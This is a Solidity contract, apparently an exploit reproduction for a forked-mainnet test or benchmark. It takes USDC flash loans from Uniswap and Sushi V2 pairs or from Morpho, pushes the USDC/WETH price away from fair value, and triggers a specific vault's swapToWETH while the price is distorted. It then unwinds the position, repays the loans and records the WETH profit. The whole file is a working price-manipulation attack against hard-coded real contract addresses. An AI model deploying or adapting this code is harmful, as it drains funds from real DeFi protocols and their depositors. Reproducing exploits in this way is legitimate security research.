// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IDexRouterLike {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

interface IDRLVaultLike {
    function swapToWETH(uint256 amount) external returns (uint256 amountOut);
}

interface IMorphoLike {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IUniV3LikePool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address internal constant DEX_ROUTER = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    address internal constant VAULT = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

    // Funding stage only: borrow existing on-chain USDC from several public V2-style
    // pools atomically, then preserve the original exploit ordering: manipulate price,
    // trigger the vault during distortion, unwind, and repay the temporary funding.
    address internal constant UNI_V2_USDC_USDT = 0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f;
    address internal constant UNI_V2_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant SUSHI_V2_USDC_WETH = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;

    uint256 internal constant TARGET_USDC_FUNDING = 13_980_773_000_000;
    uint256 internal constant VAULT_SWAP_USDC = 100_000_000_000;
    uint256 internal constant FIRST_POOL_HINT =
        14474011154664524427946373127366704448275315930774981940324572871603728323487;
    uint256 internal constant SECOND_POOL_HINT =
        57896044618658097711785492505624669893251560180390193455121166874571151938463;
    uint256 internal constant FIRST_MIN_RETURN = 96069676420420156;
    uint256 internal constant REVERSE_ETH_IN = 779999999999792152553;
    uint160 internal constant FINAL_SQRT_PRICE_LIMIT_X96 =
        1461446703485210103287273052203988822378723970341;

    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal _totalRepaymentDue;
    bool internal _executed;
    bool internal _manipulationComplete;

    constructor() {
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 startEth = address(this).balance;

        _ensureApprovals();

        if (startUsdc >= TARGET_USDC_FUNDING) {
            _manipulationComplete = true;
            _executePath(0);
        } else {
            uint256 fundingShortfall = TARGET_USDC_FUNDING - startUsdc;

            // Prefer deterministic V2/Sushi-style flashswap funding for this attempt.
            // If the aggregate public V2 liquidity at the fork block is still too thin,
            // fall back to the same public Morpho flashloan used in the original attack.
            if (_availableFlashLiquidity() >= fundingShortfall) {
                _flashswapFromPairs(0, fundingShortfall);
            } else {
                IMorphoLike(MORPHO).flashLoan(USDC, fundingShortfall, abi.encode(fundingShortfall));
            }
        }

        _snapshotProfit(startUsdc, startWeth, startEth);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        (uint256 pairIndex, uint256 expectedBorrow) = abi.decode(data, (uint256, uint256));
        address pairAddress = _pairAt(pairIndex);
        require(msg.sender == pairAddress, "only pair");

        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        require(borrowed == expectedBorrow, "bad amounts");

        uint256 repayment = _flashswapRepayment(borrowed);
        _totalRepaymentDue += repayment;

        uint256 currentUsdc = IERC20Like(USDC).balanceOf(address(this));
        if (currentUsdc < TARGET_USDC_FUNDING) {
            _flashswapFromPairs(pairIndex + 1, TARGET_USDC_FUNDING - currentUsdc);
        }

        if (!_manipulationComplete) {
            _manipulationComplete = true;
            _executePath(_totalRepaymentDue);
        }

        _safeTransfer(USDC, pairAddress, repayment);
        _totalRepaymentDue -= repayment;
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == MORPHO, "only morpho");
        require(!_manipulationComplete, "already complete");

        uint256 expectedAssets = abi.decode(data, (uint256));
        require(assets == expectedAssets, "bad assets");

        _manipulationComplete = true;
        _executePath(assets);

        IERC20Like(USDC).approve(MORPHO, type(uint256).max);
    }

    function _flashswapFromPairs(uint256 pairIndex, uint256 amountNeeded) internal {
        if (amountNeeded == 0) {
            return;
        }
        require(pairIndex < 3, "insufficient flash liquidity");

        address pairAddress = _pairAt(pairIndex);
        (bool usdcIsToken0, uint256 reserveUsdc) = _usdcOrientationAndReserve(pairAddress);
        if (reserveUsdc <= 1) {
            _flashswapFromPairs(pairIndex + 1, amountNeeded);
            return;
        }

        uint256 borrowAmount = amountNeeded;
        uint256 maxBorrow = reserveUsdc - 1;
        if (borrowAmount > maxBorrow) {
            borrowAmount = maxBorrow;
        }

        IUniswapV2PairLike(pairAddress).swap(
            usdcIsToken0 ? borrowAmount : 0,
            usdcIsToken0 ? 0 : borrowAmount,
            address(this),
            abi.encode(pairIndex, borrowAmount)
        );
    }

    function _usdcOrientationAndReserve(address pairAddress) internal view returns (bool usdcIsToken0, uint256 reserveUsdc) {
        IUniswapV2PairLike pair = IUniswapV2PairLike(pairAddress);
        address token0 = pair.token0();
        address token1 = pair.token1();
        require(token0 == USDC || token1 == USDC, "pair missing usdc");

        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        usdcIsToken0 = token0 == USDC;
        reserveUsdc = usdcIsToken0 ? uint256(reserve0) : uint256(reserve1);
    }

    function _executePath(uint256 targetUsdcBalance) internal {
        uint256 receiver = uint256(uint160(address(this)));
        uint256[] memory pools = new uint256[](1);

        // Stage 2: use the borrowed USDC to push the live USDC/WETH market away from
        // fair value so the vault reads an attacker-controlled rate.
        pools[0] = FIRST_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo(receiver, TARGET_USDC_FUNDING, FIRST_MIN_RETURN, pools);

        // Stage 3: force the vault to execute while the manipulated price is live.
        IDRLVaultLike(VAULT).swapToWETH(VAULT_SWAP_USDC);

        // Stage 4a: unwind the manipulated market move.
        pools[0] = SECOND_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo{value: REVERSE_ETH_IN}(receiver, REVERSE_ETH_IN, 0, pools);

        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }

        // Stage 4b: if the temporary V2 funding is active, buy back only the exact
        // USDC shortfall needed to settle all flashswaps. Any remaining WETH is the
        // realized gain caused by the vault's slippage loss.
        if (targetUsdcBalance != 0) {
            uint256 currentUsdc = IERC20Like(USDC).balanceOf(address(this));
            if (currentUsdc < targetUsdcBalance) {
                uint256 shortfall = targetUsdcBalance - currentUsdc;
                IUniV3LikePool(POOL).swap(
                    address(this),
                    false,
                    -_toInt256(shortfall),
                    FINAL_SQRT_PRICE_LIMIT_X96,
                    hex""
                );
            }
        }
    }

    function _pairAt(uint256 pairIndex) internal pure returns (address) {
        if (pairIndex == 0) {
            return UNI_V2_USDC_USDT;
        }
        if (pairIndex == 1) {
            return UNI_V2_USDC_WETH;
        }
        if (pairIndex == 2) {
            return SUSHI_V2_USDC_WETH;
        }
        revert("pair index");
    }

    function _availableFlashLiquidity() internal view returns (uint256 totalLiquidity) {
        for (uint256 pairIndex = 0; pairIndex < 3; ++pairIndex) {
            (, uint256 reserveUsdc) = _usdcOrientationAndReserve(_pairAt(pairIndex));
            if (reserveUsdc > 1) {
                totalLiquidity += reserveUsdc - 1;
            }
        }
    }

    function _flashswapRepayment(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _ensureApprovals() internal {
        IERC20Like(USDC).approve(TOKEN_APPROVE, type(uint256).max);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(IERC20Like(token).transfer(to, amount), "transfer failed");
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "int overflow");
        return int256(value);
    }

    function _positiveToUint256(int256 value) internal pure returns (uint256) {
        require(value >= 0, "negative value");
        return uint256(value);
    }

    function _snapshotProfit(uint256 startUsdc, uint256 startWeth, uint256 startEth) internal {
        uint256 endUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 endEth = address(this).balance;

        uint256 usdcDelta = endUsdc > startUsdc ? endUsdc - startUsdc : 0;
        uint256 wethDelta = endWeth > startWeth ? endWeth - startWeth : 0;
        uint256 ethDelta = endEth > startEth ? endEth - startEth : 0;

        _profitToken = WETH;
        _profitAmount = wethDelta;

        if (_profitAmount == 0 && usdcDelta != 0) {
            _profitToken = USDC;
            _profitAmount = usdcDelta;
        }

        if (_profitAmount == 0 && ethDelta != 0) {
            _profitToken = address(0);
            _profitAmount = ethDelta;
        }
    }

    function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function pancakeV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function _payPool(int256 amount1Delta) internal {
        require(msg.sender == POOL, "only pool");
        if (amount1Delta > 0) {
            _safeTransfer(WETH, POOL, _positiveToUint256(amount1Delta));
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}
